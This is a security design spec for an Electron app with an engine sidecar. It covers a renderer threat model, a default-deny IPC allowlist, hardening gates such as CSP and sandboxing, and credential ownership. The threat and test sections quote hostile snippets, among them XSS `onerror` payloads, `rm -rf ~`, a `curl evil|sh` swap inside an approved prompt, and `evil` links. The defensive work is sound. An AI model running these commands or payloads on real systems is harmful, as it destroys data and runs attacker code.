# P0-5 — Boundary-security minimum (renderer threat model · IPC allowlist · secret owner)

**Status: SPEC, 2026-07-02.** Branch `migration`, engine pinned to `234da9e`. This is a
**specification P1-0 must implement**, not an audit of existing code — there is no Electron /
preload / IPC scaffold yet. It sits on top of the P0-1 decision (Electron + Bun sidecar, raw
`SDKMessage` over local IPC — see `decisions/TRANSPORT.md`) and constrains what P1-0 is allowed
to build.

Scope is deliberately narrow: renderer↔engine trust boundary only. a11y, telemetry, and soak
testing are **Phase 5**, out of scope here.

All `src:line` anchors below were re-verified against `234da9e` on the `migration` branch. Where
this doc and the prose disagree, **source wins**.

---

## 1. THREAT MODEL

### Trust zones

- **UNTRUSTED — everything the renderer displays.** Model output (assistant text + tool_use
  blocks), tool output (stdout of a shell command, file contents read back), and any Markdown
  rendered into the DOM. All of it is attacker-influenceable: a repo file, a web page the model
  fetched, or an injected instruction can put arbitrary bytes here. **The renderer process
  itself is untrusted** for the purpose of this boundary — treat every frame it sends the engine
  as hostile.
- **PRIVILEGED — the Bun engine sidecar.** It holds the real capabilities: command execution
  (`src/tools/BashTool/`, `src/tools/PowerShellTool/`, `src/tools/ClaudeCliTool/`), filesystem
  mutation (`src/tools/FileWriteTool/`, `src/tools/FileEditTool/`, `src/tools/FilePatchTool/`),
  and the raw credentials (§4). The engine is the **only** place tool execution and secrets
  live. The IPC boundary is the airlock between the two zones.

The security invariant: **a byte of untrusted content must never become a privileged action
except by passing through the engine's own permission gate.** The renderer is a display + a
request emitter, nothing more.

### Concrete threats (numbered)

**T1 — Markdown-rendered content escapes into script execution (untrusted → renderer RCE).**
The renderer renders model/tool output as Markdown. If the renderer allows inline `<script>`,
`javascript:` URLs, `onerror=`/`onclick=` handlers, or unsanitized raw HTML passthrough, a
tool_result containing `![](x onerror=fetch(...))` or an `<img src=x onerror=...>` runs
attacker JS **in the renderer**. Combined with any Node/IPC reach (T2), this is the full kill
chain. Mitigated by §3 CSP + sanitized Markdown; this is the single highest-value renderer
threat because it converts *display* into *code*.

**T2 — Renderer compromise reaches Node/OS via `nodeIntegration` or a fat preload
(renderer → shell/FS directly).** If `nodeIntegration` is on, `contextIsolation` is off, or the
preload exposes `require`/`child_process`/`fs`/`ipcRenderer.send` raw, then T1's injected JS can
spawn a process or write a file **without ever touching the engine's permission gate** — it
bypasses the entire allowlist. This is the threat the whole boundary exists to kill; §3 forbids
every ingredient of it.

**T3 — Malicious link / navigation hijack (untrusted → data exfil or remote code).** A Markdown
link `[x](https://evil/)` or an injected `window.open` / `<a target>` that the renderer
follows can (a) navigate the renderer away from the local app bundle to attacker-controlled
HTML that then runs with the app's origin/privileges, or (b) beacon local context (file paths,
tool output, redacted labels) to a remote host. Mitigated by §3 navigation + `window.open` deny
handlers and a CSP `connect-src`/`navigate-to` that pins to the app origin.

**T4 — Forged / replayed IPC frame drives the engine (renderer → arbitrary engine action).**
The renderer sends `app.submit` / `permission.response` frames. A compromised renderer (via T1)
sends malformed, oversized, or type-confused frames hoping to crash the engine, inject a
non-POJO payload the raw-forwarding serializer can't survive, or exploit a schema hole.
**Confirmed hole:** `app.submit.options.goalSnapshot` is typed `z.unknown().optional()`
(`src/web/appSessionProtocol.ts:21`) and is applied straight into engine session state via
`updateGoalSnapshot` (`AppSessionController.ts:142-143`), where `goalSnapshot.threadId` becomes
the diagnostic **session identity** (`AppSessionController.ts:189`). An unvalidated object here
is a renderer-controlled write into privileged engine state. Mitigated by §2 (tighten the
schema; validate at the engine, never trust renderer shape).

**T5 — Self-approval / permission-gate bypass (renderer answers its own prompt).** The permission
round-trip is the ONLY thing standing between a model's `Bash({command:"rm -rf ~"})` and
execution. Two sub-threats:
  - **T5a (structural — cannot happen today, must stay impossible):** the renderer minting an
    approval for a tool the engine never gated. Source blocks this:
    `respondToPermissionRequest` looks the `requestId` up in the engine-side
    `pendingPermissionRequests` map and **no-ops on a miss** (`AppSessionController.ts:91-96`).
    A renderer cannot approve a call the engine didn't raise. **P1-0 must not add any path that
    lets the renderer register or pre-seed a pending request.**
  - **T5b (policy — real):** for prompts the engine *did* raise, the `behavior:"allow"` decision
    still originates renderer-side. This is by design (the human clicks Allow in the renderer),
    but it means **a T1-compromised renderer can auto-allow every real prompt.** There is no
    engine-side second gate. The mitigation is not "trust the renderer more" — it's to keep T1/T2
    impossible so the renderer stays honest, and to keep `updatedInput` from being able to
    *rewrite* the gated command (see §2, `permission.response` rule).

**T6 — `updatedInput` command-rewrite on allow (renderer → escalation within an approved
prompt).** The allow schema carries `updatedInput: z.record(z.string(), z.unknown())`
(`PermissionPromptToolResultSchema.ts:47`), and the engine runs the tool with `updatedInput`
when non-empty (`PermissionPromptToolResultSchema.ts:110-111`). So a renderer that approves a
benign-looking `Bash("ls")` prompt can swap `updatedInput.command` to `"curl evil|sh"` — the
human sees "ls", the engine runs the swap. This is a genuine escalation surface riding *inside*
a legitimate allow. §2 constrains it (the renderer must echo the gated input, not author a new
one) and it is called out as a contradiction in the report.

**T7 — Oversized / unframed IPC flood (renderer → engine DoS).** Unbounded frame size or rate on
the IPC channel lets a compromised renderer OOM or wedge the sidecar. Mitigated by §2 size/rate
caps.

---

## 2. DEFAULT-DENY IPC ALLOWLIST

**Posture: default-deny.** The preload exposes exactly ONE channel. The engine (sidecar)
validates **every** inbound frame with `appClientMessageSchema`
(`src/web/appSessionProtocol.ts:43-48`) via `safeParse` and drops anything that fails — the
same guard the WS server already uses (`AppSessionWebSocketServer.ts:113`). **Any message type,
field, or shape not on this list is rejected at the engine boundary, logged, and answered with
`app.error{code:"bad_request"}`.** There is deliberately **no** `run-command`, `write-file`,
`read-file`, `exec`, or any raw capability channel — those live behind the engine's tool +
permission machinery and are unreachable from the renderer.

The renderer bridge surface exposes direct engine-bound commands (which route all the way to the sidecar process) as well as host-level control and attachment/recovery operations (which execute inside Electron main).

### Engine Commands (Four types, routed to sidecar):

| # | Type | Payload (from `appSessionProtocol.ts`) | Validation rule (engine-side, before any effect) |
|---|---|---|---|
| A1 | `app.submit` | `{requestId, prompt, options?}` | `requestId` non-empty string; `prompt` non-empty string with an enforced **max length** (add a cap — schema has none today). `options.isMeta?` boolean only. **`options.goalSnapshot` MUST be re-typed from `z.unknown()` to the real `ThreadGoal` schema and `safeParse`d before `updateGoalSnapshot` is called** — closes T4. Reject frames with extra top-level keys (`.strict()`). |
| A2 | `app.abort` | `{requestId, reason?}` | `requestId` non-empty; `reason?` string, capped length. No engine state beyond aborting the named turn. |
| A3 | `permission.response` | `{requestId, response}` | `requestId` MUST match a **currently-pending** engine request (`AppSessionController.ts:91`); unknown id → no-op + `app.error{code:"permission_not_found"}`. `response` MUST satisfy `PermissionPromptToolResultSchema` (allow requires `{behavior:"allow", updatedInput}`; deny requires `{behavior:"deny", message}` — a bare allow is already rejected). **`updatedInput` constraint (T6):** the engine MUST treat renderer-supplied `updatedInput` as *echo-only* — if it differs from the originally-gated tool input, reject with `bad_request` rather than executing the rewrite. The renderer may confirm or deny a prompt; it may not author a *different* command inside an allow. |
| A4 | `app.ping` | `{nonce}` | `nonce` non-empty string, capped length. Liveness only; answered with `app.pong{nonce}`. No side effects. |

### Host-Level / Attachment Operations (Handled by Electron Main):

- **A5 (restart):** `{sessionId}` — Triggers sidecar process restart/recovery. Main clears stale replay buffers and requests the supervisor to restart the session's sidecar process.
- **Renderer attachment (rendererReady):** Signals that the renderer is mounted and has registered its subscription, prompting main to replay buffered frames to catch up (F2).
- **Outbound subscription (subscribe):** Wires a listener callback in the renderer to receive the outbound stream of server event frames bridged from main.

Cross-cutting rules that apply to the channel itself:

- **R1 — one channel, structured only.** Preload exposes `submit / abort / respondPermission /
  ping` and a `subscribe(cb)` for engine→renderer events. No generic `send(channel, payload)`,
  no `invoke`, no channel-name parameter the renderer controls.
- **R2 — validate at the trust boundary, not before.** The engine re-validates every frame even
  though the preload is "trusted"; the preload is in the renderer process and is compromised the
  moment T1 lands. Renderer-side checks are UX, not security.
- **R3 — no self-registration of pending permissions.** There is no inbound message that lets the
  renderer create, pre-seed, or enumerate-then-forge a pending permission requestId. Preserves
  T5a's structural guarantee.
- **R4 — frame size + rate cap (T7).** Enforce a max serialized frame size (reject oversized) and
  a per-connection rate limit at the engine's IPC read loop.
- **R5 — engine→renderer is raw `SDKMessage` but carries NO secrets** (§4). Outbound frames are
  display data + permission requests + status. The serializer must assert JSON-safe payloads
  (the P0-1 §6 contract) and must never include a token field.

---

## 3. RENDERER HARDENING CHECKLIST (acceptance criteria for P1-0)

Each item is a checkable gate. P1-0 is not done until every one passes.

**BrowserWindow / webPreferences**
- [ ] `sandbox: true` on every `BrowserWindow` that loads renderer content.
- [ ] `contextIsolation: true` (kills the prototype-pollution bridge between page and preload).
- [ ] `nodeIntegration: false` **and** `nodeIntegrationInWorker: false` and
      `nodeIntegrationInSubFrames: false`. (Directly kills T2.)
- [ ] `webviewTag: false`; no `enableRemoteModule` (removed in modern Electron — assert it's not
      re-enabled).
- [ ] `webSecurity: true` (never disabled "for dev").

**Preload surface**
- [ ] Preload uses `contextBridge.exposeInMainWorld` to expose **only** the four allowlisted
      senders + one `subscribe` (per §2 R1). Grep the preload: it must NOT reference `require`,
      `child_process`, `fs`, `process`, or a raw `ipcRenderer` handle in the exposed object.
- [ ] The exposed IPC uses fixed internal channel names the renderer cannot parameterize; the
      renderer passes payloads, never channel names.
- [ ] No `nodeIntegration`-style globals leak: `window.require`, `window.process`,
      `window.module` are all `undefined` in the loaded page (assert in a smoke test).

**CSP (for rendered Markdown — kills T1, blunts T3)**
- [ ] A `Content-Security-Policy` is delivered (response header on the app's local load, or a
      `<meta http-equiv>` as fallback) containing at minimum:
  - `default-src 'none'`
  - `script-src 'self'` — **no `'unsafe-inline'`, no `'unsafe-eval'`.**
  - `style-src 'self' 'unsafe-inline'` (Tailwind v4 runtime styles may need inline; if the build
    emits static CSS, drop `'unsafe-inline'` and re-verify).
  - `img-src 'self' data:` (base64 image blocks arrive as `data:`; no remote `img-src` unless a
    feature demands it, and then only an explicit allowlisted host).
  - `connect-src 'self'` (the renderer talks to the engine over IPC, not `fetch`; no remote
    `connect-src`).
  - `frame-src 'none'`, `object-src 'none'`, `base-uri 'none'`, `form-action 'none'`.
- [ ] Markdown is rendered through a sanitizer (e.g. a strict allowlist renderer /
      DOMPurify-equivalent) BEFORE insertion: no raw HTML passthrough, `javascript:`/`data:` (for
      non-image) / `vbscript:` URLs stripped, event-handler attributes stripped. CSP is
      defense-in-depth; sanitize anyway (belt + suspenders for T1).

**Navigation / window.open (kills T3)**
- [ ] `webContents.on('will-navigate', …)` cancels any navigation whose target is not the app's
      own bundle origin.
- [ ] `webContents.setWindowOpenHandler(…)` returns `{action:'deny'}` for all
      renderer-initiated `window.open` / `target=_blank`; external links (if any product need)
      are opened via `shell.openExternal` **only after** an explicit URL-scheme allowlist check
      (`https:` only), never by letting the renderer navigate.
- [ ] `will-redirect` handled the same as `will-navigate`.

**Verification gate**
- [ ] A smoke test loads a crafted Markdown payload containing `<img onerror>`, an inline
      `<script>`, a `javascript:` link, and a `<a target=_blank href=https://evil>` and asserts:
      no script ran (CSP report / no console eval), no navigation occurred, no new window opened.

---

## 4. SECRET-HANDLING OWNER

**Owner: the Bun engine sidecar — and only the engine — holds raw credentials. Known credential-bearing keys are blocked by the outbound secret-key guard; value-level content scanning is not implemented.**

Where the secrets actually live (verified):

- **Anthropic / Claude OAuth + API keys:** `src/utils/auth.ts`. Token accessors are engine-side
  functions — `getAnthropicApiKey()` (:220), `getCodexOAuthTokens()` (:1362),
  `saveCodexOAuthTokens()` (:1346), `saveOAuthTokensIfNeeded()` (:1200), `saveApiKey()` (:1100).
  These read from the OS keychain / config / file descriptors; none of them is reachable from an
  IPC message in §2.
- **Codex / ChatGPT subscription tokens:** `src/codex-core/accounts.ts`. A `CodexCoreAccount`
  carries `accessToken` + `refreshToken` (:25-26) and a `vaultFilePath` (:31); tokens are
  persisted via `saveCodexTokenToVault` and refreshed via `refreshCodexToken`
  (accounts.ts:155-175). This is the raw-secret store for the Codex fork. It is engine-side and
  stays there.

Rules:

- [ ] **No token field crosses IPC.** The §2 engine→renderer event stream (raw `SDKMessage` +
      status) MUST NOT include `accessToken`, `refreshToken`, `apiKey`, `vaultFilePath`, or any
      derivative. A serializer-level assertion should reject any outbound frame carrying a
      known-secret key name (defense-in-depth against an accidental leak; ties to §2 R5). Note that value-level content scanning is not performed.
- [ ] **The renderer is allowed to see status only, never material:** a redacted account label /
      alias (`CodexCoreAccount.alias`, accounts.ts:30 — a human name, not a token), the active
      provider/model string, and account availability state (`available` / `blocked` / reason
      text) — the redacted status the engine already computes for account pools. That is the
      entire renderer-visible credential surface.
- [ ] **Auth/login flows stay engine-side.** OAuth redirect handling, refresh, and vault writes
      happen in the sidecar. If a login UI is ever needed, the renderer collects nothing sensitive
      and hands off to the engine / OS browser; it does not receive the resulting tokens.

---

## Appendix — anchors re-verified against `234da9e` (`migration`)

- Client message schema (the 4 allowed types): `src/web/appSessionProtocol.ts:13-48`.
- `goalSnapshot` typed `z.unknown()` — the T4 hole: `appSessionProtocol.ts:21`.
- Engine applies `goalSnapshot` to session state + uses `threadId` as session id:
  `AppSessionController.ts:142-143`, `:189`.
- Permission reply requires a pending engine-minted requestId (T5a): `AppSessionController.ts:91-96`.
- `updatedInput` runs the (possibly-rewritten) tool input (T6):
  `PermissionPromptToolResultSchema.ts:44-63`, `:110-111`.
- Existing `safeParse` guard the IPC boundary must reuse: `AppSessionWebSocketServer.ts:113`.
- Privileged tools behind the boundary: `src/tools/BashTool/`, `src/tools/PowerShellTool/`,
  `src/tools/ClaudeCliTool/`, `src/tools/FileWriteTool/`, `src/tools/FileEditTool/`,
  `src/tools/FilePatchTool/`.
- Raw secrets: `src/utils/auth.ts` (:220, :1346, :1362), `src/codex-core/accounts.ts` (:25-31, :155-175).

---

## Addendum 2026-07-04 — trust zone: the host control plane (Phase-3, DR-4)

*Added by the Phase-3 pre-work track after the 2026-07-03 pressure-test review found DR-4
("the control plane sits in no trust zone") still unexecuted. The contract itself lives in
`decisions/REGISTRY.md` §6.1; this addendum owns the security rules.*

Phase 3 introduces a fifth zone between the renderer and the supervisor: the **host control
plane** — Electron main + the Electron-free host module executing
`createSession / restoreSession / closeSession / listSessions`. Unlike the four engine
commands (§2), these operations **originate in main**, never cross into a sidecar as frames,
and mint new engine processes — which makes their inputs (above all a working directory)
security-relevant in a way no session frame is.

**T8 — renderer-authored cwd (session-scope injection).** A compromised renderer that can name
an arbitrary `cwd` for a new session scopes every tool of that session to an attacker-chosen
directory (and can use restore/create to probe the filesystem via error differences). The cwd
decides what `Bash`/file tools reach *before* any permission prompt exists.

Rules (extend §2's R-rules; all enforced in main/host, never in the preload):

- **HC1 — the renderer never authors a filesystem path.** A session's `cwd` originates only
  from (a) Electron main's **native directory picker** (`dialog.showOpenDialog` — a trusted
  surface the renderer can request but not answer) or (b) an existing registry row (restore).
  The host API re-validates regardless of origin: `realpath`, exists, `isDirectory` — reject
  with typed `invalid_cwd` otherwise. Defense in depth: even if a raw string ever reaches the
  API, it is canonicalized and existence-checked, never trusted.
- **HC2 — session addressing is validated, not trusted.** Control-plane calls take an
  `appSessionId`; the host checks UUID shape + registry/live membership and answers unknown ids
  with typed `session_not_found` (mirrors `decisions/PROTOCOL-ENVELOPE.md` §3) — no silent
  drops, no throw-through into main.
- **HC3 — preload surface stays default-deny.** Control-plane methods are added to the preload
  as **fixed, per-method structured senders** exactly like the four session channels (extends
  R1). No generic `invoke`, no renderer-controlled channel names, no method that returns
  filesystem contents.
- **HC4 — spawning is bounded.** `MAX_REGISTRY_SESSIONS` (registry bound) plus a spawn rate cap
  extend T7's flood posture to process creation: a compromised renderer must not be able to
  fork-bomb the machine through `createSession`.

The sidecar trust boundary (§2) is unchanged: the control plane never adds an inbound frame
type to the socket protocol; its only contact with a sidecar is the spawn environment
(`CATCODE_SIDECAR_SESSION_ID`, cwd, resume id), which is main-owned input, not renderer input.

---

## Scope note — `secretGuard` is a KEY-NAME guard, not a value scanner (ON RECORD, accepted)

*Added 2026-07-09 during the Phase-4 10-lane review, so a future reader does not mistake
`secretGuard` for a value-channel secret scanner.*

`secretGuard`/`scanForSecrets` (`app/shared/secretGuard.ts`) rejects an outbound frame when a
**property KEY** looks credential-shaped (`token`, `apiKey`, `authorization`, …). It does **not**
inspect string VALUES. A user-inlined secret carried inside an ordinary value-channel string is
therefore **not** caught. Concretely on record:

- `directConnect.wsUrl` / the direct-connect server URL a user types (P4-13) — a secret embedded
  in the URL rides through as a value.
- `HookEntry.displayLine` (P4-12 — `getHookDisplayText`, e.g. a hook command line) and
  `McpConfigEntry.url` (P4-12 — a configured MCP server URL) — a credential a user wrote into the
  command/URL is a value, not a key.

**Severity: LOW, accepted — not a new guard requirement.** The transport is a same-machine
Electron socket the user already controls; every one of these fields is **user-authored** config
the user typed themselves; and each mirrors what the engine's own display functions
(`getHookDisplayText`, the CLI's bridge/`/status` panes) already surface to the same user. The
exposure is "a user can see a secret they themselves inlined into their own config," which is not
a boundary escalation. If a value-channel scan is ever wanted it is a NEW decision; `secretGuard`
stays a key-name guard.
